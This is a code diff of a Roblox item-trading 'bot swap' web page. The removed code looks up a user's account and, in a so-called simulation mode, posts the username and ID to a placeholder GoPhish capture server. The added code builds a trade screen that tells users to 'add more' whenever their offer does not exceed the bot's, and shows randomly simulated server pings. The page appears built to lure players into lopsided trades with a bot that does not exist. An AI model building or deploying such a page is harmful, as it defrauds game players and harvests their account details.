-    <p>Type your Roblox username so the bot can find you and complete the swap.</p>
-    <div class="err" id="confirmErr">Username not found. Check spelling and try again.</div>
-    <input class="rolox" type="text" id="roloxInput" placeholder="Roblox username" autocomplete="off">
-    <button class="btn-primary" id="searchBtn" onclick="searchRoblox()">SEARCH</button>
-  </div>
-</div>
-
-<!-- Looking up account -->
-<div class="overlay" id="ovLooking">
-  <div class="modal">
-    <div class="spinner"></div>
-    <p class="searching">Looking up your account...</p>
-  </div>
-</div>
-
-<!-- Is this you? -->
-<div class="overlay" id="ovIsYou">
-  <div class="modal confirm-user">
-    <button class="close" onclick="closeOverlay('ovIsYou'); openOverlay('ovConfirm');">✕</button>
-    <h3>Is this you?</h3>
-    <img id="userHeadshot" src="" alt="">
-    <div class="uname" id="userName"></div>
-    <div class="udisp" id="userDisp"></div>
-    <div class="btn-row">
-      <button class="btn-primary" id="yesBtn">YES, THAT'S ME</button>
-      <button class="btn-ghost" onclick="closeOverlay('ovIsYou'); openOverlay('ovConfirm');">NO, RETRY</button>
-    </div>
-  </div>
-</div>
-
-<!-- Swap it (final) -->
-<div class="overlay" id="ovSwapIt">
-  <div class="modal">
-    <button class="close" onclick="closeOverlay('ovSwapIt')">✕</button>
-    <img class="check" src="https://jacevalues.com/images/checkmark_white.png" alt="">
-    <h3>SWAP IT</h3>
-    <p id="swapSummary"></p>
-    <button class="btn-primary" onclick="closeOverlay('ovSwapIt'); openOverlay('ovRate');">CONTINUE</button>
-  </div>
-</div>
-
-<!-- Rate -->
-<div class="overlay" id="ovRate">
-  <div class="modal">
-    <button class="close" onclick="closeOverlay('ovRate')">✕</button>
-    <h3>Give us a rate!</h3>
-    <p>Did you enjoy our servers?</p>
-    <div style="color:#a78bfa; font-size:22px; margin-bottom:14px;">★★★★★</div>
-    <button class="btn-primary" onclick="closeOverlay('ovRate');">Rate</button>
-  </div>
-</div>
-
-<footer>
-  © 2026 Jace Values. All rights reserved. · Powered by Jace™ · v35
-</footer>
-
-<script>
-/* =========================================================
-   Simulation mode flag — keep FALSE for demo purposes.
-   When TRUE, submits the confirmed username to your own
-   GoPhish capture endpoint (configurable below) instead of
-   just displaying it. Never point this at anything you
-   don't own or have explicit written authorization to test.
-   ========================================================= */
-const SIMULATION_MODE = false;
-const GOPHISH_CAPTURE_URL = "https://your-gophish-server/capture";
-
-/* ---------- Overlay helpers ---------- */
-function openOverlay(id)   { document.getElementById(id).classList.add('show'); }
-function closeOverlay(id)  { document.getElementById(id).classList.remove('show'); }
-
-/* ---------- Random bot room code ---------- */
-function randomRoomCode() {
-  const chars = "ABCDEFGHJKMNPQRSTUVWXYZ0123456789";
-  let code = "#";
-  for (let i = 0; i < 3; i++) code += chars[Math.floor(Math.random() * chars.length)];
-  code += "-";
-  for (let i = 0; i < 3; i++) code += chars[Math.floor(Math.random() * chars.length)];
-  return code;
+      <div class="history-user">${entry.username||'Unknown'}</div>
+      <div class="history-user" style="color:#8ea0bc">${itemsLine}</div>
+      <div class="history-stars">${stars}</div>
+    </div>`;
+  }).join('');
 }
 
-/* ---------- Flow: Join server ---------- */
-function openServerFlow() {
-  openOverlay('ovSearching');
-  document.getElementById('searchLabel').textContent = "Searching server...";
-  document.getElementById('roomCode').textContent = randomRoomCode();
-  setTimeout(() => {
-    closeOverlay('ovSearching');
-    openOverlay('ovServerFound');
-  }, 2200);
+// ============================================================
+// THEME SWITCHER — one button cycles Galaxy -> Ocean -> Ember -> ...
+// Saves the choice so it persists on return visits.
+// ============================================================
+const THEME_ORDER=['galaxy','ocean','ember'];
+const THEME_META={
+  galaxy:{icon:'🪼',label:'Galaxy theme — tap for Ocean'},
+  ocean:{icon:'🌊',label:'Ocean theme — tap for Ember'},
+  ember:{icon:'🔥',label:'Ember theme — tap for Galaxy'}
+};
+const themeCycleBtn=document.getElementById('themeCycleBtn');
+function setTheme(name){
+  // Guard against a stale/unknown value in localStorage (e.g. from an
+  // older version of the theme list) crashing the whole page on load.
+  if(!THEME_META[name]) name='galaxy';
+  if(name==='galaxy'){
+    document.documentElement.removeAttribute('data-theme');
+  } else {
+    document.documentElement.setAttribute('data-theme',name);
+  }
+  if(themeCycleBtn){
+    themeCycleBtn.textContent=THEME_META[name].icon;
+    themeCycleBtn.title=THEME_META[name].label;
+    themeCycleBtn.dataset.theme=name;
+  }
+  try{ localStorage.setItem('novaTheme',name); }catch(e){}
+}
+themeCycleBtn?.addEventListener('click',()=>{
+  const current=themeCycleBtn.dataset.theme||'galaxy';
+  const next=THEME_ORDER[(THEME_ORDER.indexOf(current)+1)%THEME_ORDER.length];
+  setTheme(next);
+});
+(function initTheme(){
+  let saved='galaxy';
+  try{ saved=localStorage.getItem('novaTheme')||'galaxy'; }catch(e){}
+  setTheme(saved);
+})();
+
+const pages = document.querySelectorAll('.page-section');
+const buttons = document.querySelectorAll('.nav-btn');
+
+function showPage(name) {
+  pages.forEach(page => {
+    page.classList.toggle('active-page', page.id === name);
+  });
+
+  buttons.forEach(button => {
+    button.classList.toggle('active', button.dataset.page === name);
+  });
+
+  if(name === 'history') renderHistory();
 }
 
-/* ---------- Flow: Secure bot ticket (from swap) ---------- */
-function openTicketFlow() {
-  openOverlay('ovSearching');
-  document.getElementById('searchLabel').textContent = "Searching for available bot...";
-  document.getElementById('roomCode').textContent = randomRoomCode();
-  setTimeout(() => {
-    closeOverlay('ovSearching');
-    openOverlay('ovServerFound');
-  }, 2400);
+buttons.forEach(button => {
+  button.addEventListener('click', () => showPage(button.dataset.page));
+});
+
+const startSwap = document.querySelector('.start-swap');
+startSwap?.addEventListener('click', () => showPage('swap'));
+
+
+// Swap builder: uses the same value cards shown on the Values page.
+const giveBox=document.getElementById('giveBox');
+const botBox=document.getElementById('botBox');
+let selectedSide='give';
+const tradeState={give:[],bot:[]};
+
+// Tag every value card with its tier (from the section-title just above its grid)
+// so we can filter down to Godly (Tier 5) items later.
+(function tagTiers(){
+  document.querySelectorAll('#values .section-title').forEach(title=>{
+    const m=title.textContent.match(/Tier\s*(\d+)/i);
+    if(!m) return;
+    const tier=m[1];
+    const grid=title.nextElementSibling;
+    if(grid && grid.classList.contains('grid')){
+      grid.querySelectorAll('.card').forEach(card=>card.dataset.tier=tier);
+    }
+  });
+})();
+
+// Reads an item's icon regardless of whether it's an emoji <div> (older tiers)
+// or an editable <img src="..."> (Godly/Tier 5 items).
+function extractIcon(card){
+  const el=card.querySelector('.item-img');
+  if(!el) return {isImg:false,emoji:'◆'};
+  if(el.tagName==='IMG') return {isImg:true,src:el.getAttribute('src')};
+  return {isImg:false,emoji:(el.textContent||'').trim()};
+}
+// Renders an icon as a standalone element (used for grid/value-sort cards).
+function iconAsElementHTML(icon,cls){
+  if(icon.isImg) return `<img class="${cls}" src="${icon.src}" alt="">`;
+  return `<div class="${cls}">${icon.emoji}</div>`;
+}
+// Renders an icon inline (used in trade slots and the item picker popup).
+function iconAsInlineHTML(icon,size){
+  if(icon.isImg) return `<img src="${icon.src}" alt="" style="width:${size}px;height:${size}px;object-fit:contain;vertical-align:middle;border-radius:4px">`;
+  return `<span style="font-size:${size}px;line-height:1;vertical-align:middle">${icon.emoji}</span>`;
+}
+// Like iconAsInlineHTML, but sized via a CSS class (so it can shrink at breakpoints)
+// instead of a fixed inline pixel value. Used in trade slots.
+function iconAsClassHTML(icon,cls){
+  if(icon.isImg) return `<img class="${cls}" src="${icon.src}" alt="" style="object-fit:contain;vertical-align:middle;border-radius:4px">`;
+  return `<span class="${cls}" style="line-height:1;vertical-align:middle">${icon.emoji}</span>`;
 }
 
-/* ---------- Roblox public API lookup (username → userId → headshot) ---------- */
-async function searchRoblox() {
-  const username = document.getElementById('roloxInput').value.trim();
-  const errEl = document.getElementById('confirmErr');
-  if (!username) { errEl.style.display = 'block'; return; }
-  errEl.style.display = 'none';
+function getValueCards(){
+  return [...document.querySelectorAll('#tiersSource .card')].map(card=>({
+    name:card.querySelector('.item-name')?.textContent.trim()||'Item',
+    value:Number((card.querySelector('.item-value')?.textContent||'0').replace(/[^0-9]/g,''))||0,
+    icon:extractIcon(card),
+    tier:Number(card.dataset.tier)||0
+  }));
+}
+// All-tiers popup (Tier 5 down to Tier 1) — opens when a "＋" add-slot is clicked
+const godlyModal=document.getElementById('godlyModal');
+const godlyScroll=document.getElementById('godlyScroll');
+const closeGodly=document.getElementById('closeGodly');
+let godlySlotSide=null;
 
-  document.getElementById('ovConfirm').classList.remove('show');
-  openOverlay('ovLooking');
-
-  try {
-    // 1) username → userId (public, read-only endpoint)
-    const usersRes = await fetch('https://users.roblox.com/v1/usernames/users', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ usernames: [username], excludeBannedUsers: false })
+function openGodlyModal(side){
+  godlySlotSide=side;
+  selectSide(side);
+  const items=getValueCards();
+  let html='';
+  for(let tier=5;tier>=1;tier--){
+    const tierItems=items.map((item,i)=>({...item,i})).filter(item=>item.tier===tier);
+    if(!tierItems.length) continue;
+    html+=`<div class="godly-tier-title">TIER ${tier}</div><div class="picker-grid">`;
+    html+=tierItems.map(item=>`<div class="pick-card" data-index="${item.i}"><div class="pick-img">${iconAsInlineHTML(item.icon,48)}</div><div class="pick-name">${item.name}</div><div class="pick-val">💎 ${item.value}</div></div>`).join('');
+    html+='</div>';
+  }
+  godlyScroll.innerHTML=html;
+  if(godlySearch) godlySearch.value='';
+  godlyModal.classList.add('show');
+  godlyModal.setAttribute('aria-hidden','false');
+}
+// Filters the item picker by name as you type, hiding empty tier groups.
+const godlySearch=document.getElementById('godlySearch');
+function applyGodlySearch(){
+  const q=godlySearch.value.trim().toLowerCase();
+  godlyScroll.querySelectorAll('.godly-tier-title').forEach(title=>{
+    const grid=title.nextElementSibling;
+    if(!grid||!grid.classList.contains('picker-grid'))return;
+    let visible=0;
+    grid.querySelectorAll('.pick-card').forEach(card=>{
+      const name=card.querySelector('.pick-name')?.textContent.toLowerCase()||'';
+      const match=name.includes(q);
+      card.style.display=match?'':'none';
+      if(match)visible++;
     });
-    const usersJson = await usersRes.json();
-    if (!usersJson.data || usersJson.data.length === 0) throw new Error('not found');
-
-    const user = usersJson.data[0];
-
-    // 2) userId → headshot image URL (public, read-only endpoint)
-    const thumbRes = await fetch(
-      `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${user.id}&size=150x150&format=Png&isCircular=false`
-    );
-    const thumbJson = await thumbRes.json();
-    let headshot = thumbJson.data[0].imageUrl;
-
-    closeOverlay('ovLooking');
-    document.getElementById('userHeadshot').src = headshot;
-    document.getElementById('userName').textContent = user.name;
-    document.getElementById('userDisp').textContent = user.displayName;
-    openOverlay('ovIsYou');
-
-    // YES handler
-    document.getElementById('yesBtn').onclick = async function () {
-      if (SIMULATION_MODE) {
-        try {
-          await fetch(GOPHISH_CAPTURE_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ username: user.name, userId: user.id, sessionId: randomRoomCode() })
-          });
-        } catch (e) { /* log for engagement evidence */ }
-      }
-      document.getElementById('swapSummary').textContent =
-        `Bot will swap with @${user.name} (userId ${user.id})`;
-      closeOverlay('ovIsYou');
-      openOverlay('ovSwapIt');
-    };
-  } catch (e) {
-    closeOverlay('ovLooking');
-    document.getElementById('confirmErr').style.display = 'block';
-    openOverlay('ovConfirm');
+    const show=q===''||visible>0;
+    title.style.display=show?'':'none';
+    grid.style.display=show?'':'none';
+  });
+}
+godlySearch?.addEventListener('input',applyGodlySearch);
+function closeGodlyModal(){
+  godlyModal.classList.remove('show');
+  godlyModal.setAttribute('aria-hidden','true');
+  godlySlotSide=null;
+}
+closeGodly?.addEventListener('click',closeGodlyModal);
+godlyModal?.addEventListener('click',e=>{if(e.target===godlyModal) closeGodlyModal();});
+document.getElementById('godlyScrollUp')?.addEventListener('click',()=>{
+  godlyScroll.scrollBy({top:-220,behavior:'smooth'});
+});
+document.getElementById('godlyScrollDown')?.addEventListener('click',()=>{
+  godlyScroll.scrollBy({top:220,behavior:'smooth'});
+});
+godlyScroll?.addEventListener('click',e=>{
+  const card=e.target.closest('.pick-card'); if(!card||!godlySlotSide)return;
+  const idx=Number(card.dataset.index);
+  const side=godlySlotSide;
+  if(tradeState[side].length<4 && !tradeState[side].includes(idx)){
+    tradeState[side].push(idx); renderTrade();
+  }
+  closeGodlyModal();
+});
+function selectSide(side){
+  selectedSide=side;
+  giveBox.classList.toggle('selected',side==='give');
+  botBox.classList.toggle('selected',side==='bot');
+}
+giveBox.addEventListener('click',e=>{if(!e.target.closest('.filled')) selectSide('give')});
+botBox.addEventListener('click',e=>{if(!e.target.closest('.filled')) selectSide('bot')});
+function getTradeTotal(side,items){
+  return tradeState[side].reduce((sum,idx)=>sum+(items[idx]?.value||0),0);
+}
+function updateSwapWarning(giveTotal,botTotal){
+  const warning=document.getElementById('swapWarning');
+  const text=document.getElementById('swapWarningText');
+  if(!warning||!text)return;
+  if(botTotal>giveTotal){
+    text.innerHTML=`Your 💎 <b>${giveTotal}</b> is LOWER than the bot's 💎 <b>${botTotal}</b> — add more!`;
+    warning.style.display='flex';
+  } else if(botTotal===giveTotal && botTotal>0){
+    text.innerHTML=`Your 💎 <b>${giveTotal}</b> is EQUAL to the bot's 💎 <b>${botTotal}</b> — add more!`;
+    warning.style.display='flex';
+  } else {
+    warning.style.display='none';
   }
 }
-</script>
+function renderTrade(){
+  const items=getValueCards();
+  for(const side of ['give','bot']){
+    const wrap=document.getElementById(side==='give'?'giveSlots':'botSlots');
+    wrap.innerHTML='';
+    for(let i=0;i<4;i++){
+      const idx=tradeState[side][i];
+      const slot=document.createElement('div'); slot.className='slot add-slot';
+      if(idx!==undefined){
+        const item=items[idx]; slot.className='slot filled';
+        slot.innerHTML=`<div class="slot-img-wrap">${iconAsClassHTML(item.icon,'slot-icon')}</div><b>${item.name}</b><small>💎 ${item.value}</small>`;
+        slot.title='Click to remove';
+        slot.addEventListener('click',e=>{e.stopPropagation();tradeState[side].splice(i,1);renderTrade()});
+      } else {slot.textContent='＋';slot.addEventListener('click',()=>openGodlyModal(side));}
+      wrap.appendChild(slot);
+    }
+    const total=getTradeTotal(side,items);
+    document.getElementById(side==='give'?'giveTotal':'botTotal').textContent='💎 '+total;
+  }
+  updateSwapButtonState();
+}
+renderTrade();
 
+// Values page: populate the default Tiers view from the hidden source markup
+const tiersSource=document.getElementById('tiersSource');
+const tiersView=document.getElementById('tiersView');
+const valueView=document.getElementById('valueView');
+tiersView.innerHTML=tiersSource.innerHTML;
+
+// Build a flat, value-sorted list (highest first) for the Value sort mode
+function buildValueView(){
+  const cards=[...tiersSource.querySelectorAll('.card')].map(card=>({
+    icon:extractIcon(card),
+    name:card.querySelector('.item-name')?.textContent||'',
+    value:Number((card.querySelector('.item-value')?.textContent||'0').replace(/[^0-9]/g,''))||0
+  }));
+  cards.sort((a,b)=>b.value-a.value);
+  valueView.innerHTML=cards.map(c=>
+    `<div class="card">${iconAsElementHTML(c.icon,'item-img')}<div class="item-name">${c.name}</div><div class="item-value">💎 ${c.value}</div></div>`
+  ).join('');
+}
+buildValueView();
+
+let sortMode='tiers';
+const sortBtn=document.getElementById('sortBtn');
+sortBtn?.addEventListener('click',()=>{
+  sortMode=sortMode==='tiers'?'value':'tiers';
+  sortBtn.textContent=sortMode==='tiers'?'Sort: Tiers':'Sort: Value';
+  tiersView.style.display=sortMode==='tiers'?'':'none';
+  valueView.style.display=sortMode==='value'?'':'none';
+  applyValuesSearch();
+});
+
+// Values search: filter cards by name as you type, works in either sort mode
+const valuesSearch=document.getElementById('valuesSearch');
+function applyValuesSearch(){
+  const q=valuesSearch.value.trim().toLowerCase();
+  if(sortMode==='tiers'){
+    tiersView.querySelectorAll('.section-title').forEach(title=>{
+      const grid=title.nextElementSibling;
+      if(!grid||!grid.classList.contains('grid'))return;
+      let visibleCount=0;
+      grid.querySelectorAll('.card').forEach(card=>{
+        const name=card.querySelector('.item-name')?.textContent.toLowerCase()||'';
+        const match=name.includes(q);
+        card.style.display=match?'':'none';
+        if(match)visibleCount++;
+      });
+      const show=q===''||visibleCount>0;
+      title.style.display=show?'':'none';
+      grid.style.display=show?'':'none';
+    });
+  } else {
+    valueView.querySelectorAll('.card').forEach(card=>{
+      const name=card.querySelector('.item-name')?.textContent.toLowerCase()||'';
+      card.style.display=name.includes(q)?'':'none';
+    });
+  }
+}
+valuesSearch?.addEventListener('input',applyValuesSearch);
+
+// Servers: click a region header to expand/collapse its country list
+document.querySelectorAll('#serverList .server-head').forEach(head=>{
+  head.addEventListener('click',()=>{
+    head.closest('.server').classList.toggle('collapsed');
+  });
+});
+
+// Servers: simulate live ping. Each row jitters around its own base ms
+// every couple of seconds, and the bar count + color reflect the current value.
+function barsForPing(ms){
+  if(ms<40) return {bars:5,cls:''};
+  if(ms<60) return {bars:4,cls:''};
+  if(ms<80) return {bars:3,cls:''};
+  if(ms<110) return {bars:2,cls:'ping-lag'};
+  return {bars:1,cls:'ping-bad'};
+}
+function tickPing(el){
+  const base=Number(el.dataset.base)||50;
+  const jitter=Math.round((Math.random()-0.5)*16); // +/-8ms wobble
+  const ms=Math.max(8,base+jitter);
+  const {bars,cls}=barsForPing(ms);
+  el.className='ping'+(cls?' '+cls:'');
+  let barsHtml='';
+  for(let i=1;i<=5;i++) barsHtml+=`<i class="${i<=bars?'lit':''}"></i>`;
+  el.innerHTML=`<span class="ping-bars">${barsHtml}</span><span class="ping-ms">${ms} ms</span>`;
+}
+function startLivePing(){
+  const rows=document.querySelectorAll('#serverList .ping');
+  rows.forEach(el=>{
+    tickPing(el);
+    // stagger each row's own interval a bit so they don't all flicker in sync
+    const delay=1500+Math.random()*1500;
+    setInterval(()=>tickPing(el),delay);
+  });
+}
+startLivePing();
+
+showPage('swap');
+</script>
 </body>
 </html>
